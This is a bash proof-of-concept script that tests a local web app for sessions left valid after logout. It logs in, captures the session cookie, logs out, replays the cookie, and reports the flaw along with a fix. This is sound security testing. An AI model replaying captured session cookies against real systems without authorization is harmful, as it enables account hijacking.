#!/bin/bash

# POC: Session Not Invalidated on Logout - Session Hijacking Risk
# This POC demonstrates that session cookies remain valid after logout

TARGET="http://localhost:8080"
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

echo "=========================================="
echo "POC: Session Not Invalidated on Logout"
echo "=========================================="
echo ""

# Step 1: Login and capture session cookie
echo -e "${YELLOW}[Step 1]${NC} Logging in to capture session cookie..."
LOGIN_RESPONSE=$(curl -s -i -X POST "$TARGET/login" \
  -d "username=test&password=test" 2>&1)

# Extract session cookie from Set-Cookie header
SESSION_COOKIE=$(echo "$LOGIN_RESPONSE" | grep -i "Set-Cookie: session=" | head -1 | sed 's/.*session=\([^;]*\).*/\1/')

if [ -z "$SESSION_COOKIE" ]; then
  echo -e "${RED}[FAILED]${NC} Could not obtain session cookie"
  echo "Login Response Headers:"
  echo "$LOGIN_RESPONSE" | head -20
  exit 1
fi

echo -e "${GREEN}[SUCCESS]${NC} Session cookie obtained"
echo "Cookie value: ${SESSION_COOKIE:0:60}..."
echo ""

# Step 2: Verify session works - access authenticated page
echo -e "${YELLOW}[Step 2]${NC} Verifying session grants authenticated access..."
AUTH_TEST=$(curl -s -w "\nHTTP_CODE:%{http_code}" "$TARGET/home" \
  -H "Cookie: session=$SESSION_COOKIE")

HTTP_CODE=$(echo "$AUTH_TEST" | grep -oP 'HTTP_CODE:\K\d+')
BODY=$(echo "$AUTH_TEST" | sed 's/HTTP_CODE:.*//')

if [ "$HTTP_CODE" = "200" ] && echo "$BODY" | grep -qi "Welcome"; then
  echo -e "${GREEN}[SUCCESS]${NC} Session is valid - authenticated access granted (HTTP $HTTP_CODE)"
  WELCOME_TEXT=$(echo "$BODY" | grep -oP 'Welcome[^<]*' | head -1)
  echo "Response: $WELCOME_TEXT"
else
  echo -e "${RED}[FAILED]${NC} Session authentication failed (HTTP $HTTP_CODE)"
  exit 1
fi
echo ""

# Step 3: Logout using the session cookie
echo -e "${YELLOW}[Step 3]${NC} Logging out (session should be invalidated)..."
LOGOUT_RESPONSE=$(curl -s -i "$TARGET/logout" \
  -H "Cookie: session=$SESSION_COOKIE")

if echo "$LOGOUT_RESPONSE" | grep -qi "Set-Cookie.*session="; then
  echo -e "${GREEN}[SUCCESS]${NC} Logout executed - client-side cookie cleared"
  LOGOUT_COOKIE=$(echo "$LOGOUT_RESPONSE" | grep -i 'Set-Cookie:.*session' | head -1)
  echo "Logout Cookie: $(echo $LOGOUT_COOKIE | cut -c1-80)..."
else
  echo -e "${YELLOW}[WARNING]${NC} Logout executed"
fi
echo ""

# Step 4: CRITICAL TEST - Reuse old session cookie after logout
echo -e "${YELLOW}[Step 4 - CRITICAL]${NC} Attempting to reuse old session cookie after logout..."
sleep 1  # Brief pause to ensure logout completes
REUSE_TEST=$(curl -s -w "\nHTTP_CODE:%{http_code}" "$TARGET/home" \
  -H "Cookie: session=$SESSION_COOKIE")

REUSE_HTTP_CODE=$(echo "$REUSE_TEST" | grep -oP 'HTTP_CODE:\K\d+')
REUSE_BODY=$(echo "$REUSE_TEST" | sed 's/HTTP_CODE:.*//')

echo ""
echo "=========================================="
echo "VULNERABILITY TEST RESULTS"
echo "=========================================="
echo ""

if [ "$REUSE_HTTP_CODE" = "200" ] && echo "$REUSE_BODY" | grep -qi "Welcome"; then
  echo -e "${RED}[VULNERABLE] ✗ SECURITY FLAW CONFIRMED${NC}"
  echo ""
  echo "Session cookie is STILL VALID after logout!"
  echo ""
  echo "Attack Scenario Demonstrated:"
  echo "1. User logged in successfully ✓"
  echo "2. Session cookie captured: ${SESSION_COOKIE:0:50}..."
  echo "3. User logged out ✓"
  echo "4. Old session cookie STILL grants access ✗"
  echo ""
  echo "Evidence:"
  echo "- HTTP Response Code: $REUSE_HTTP_CODE (OK)"
  REUSE_WELCOME=$(echo "$REUSE_BODY" | grep -oP 'Welcome[^<]*' | head -1)
  echo "- Authenticated content: $REUSE_WELCOME"
  echo ""
  echo -e "${RED}SECURITY IMPACT:${NC}"
  echo "• Stolen session cookies remain valid indefinitely"
  echo "• Users cannot invalidate compromised sessions by logging out"
  echo "• Enables persistent session hijacking attacks"
  echo "• Shared computer sessions can be reused"
  echo ""
  echo "Recommendation: Implement server-side session invalidation"
  exit 0
elif [ "$REUSE_HTTP_CODE" = "302" ]; then
  echo -e "${GREEN}[SECURE]${NC} Session was properly invalidated"
  echo "HTTP Response Code: $REUSE_HTTP_CODE (Redirect to login)"
  echo "The session cookie no longer grants access - system is secure"
  exit 1
elif [ "$REUSE_HTTP_CODE" = "401" ]; then
  echo -e "${GREEN}[SECURE]${NC} Session was properly invalidated"
  echo "HTTP Response Code: $REUSE_HTTP_CODE (Unauthorized)"
  echo "The session cookie no longer grants access - system is secure"
  exit 1
else
  echo -e "${YELLOW}[UNCLEAR]${NC} Unexpected response"
  echo "HTTP Response Code: $REUSE_HTTP_CODE"
  echo "Body preview: $(echo "$REUSE_BODY" | head -c 200)"
  exit 1
fi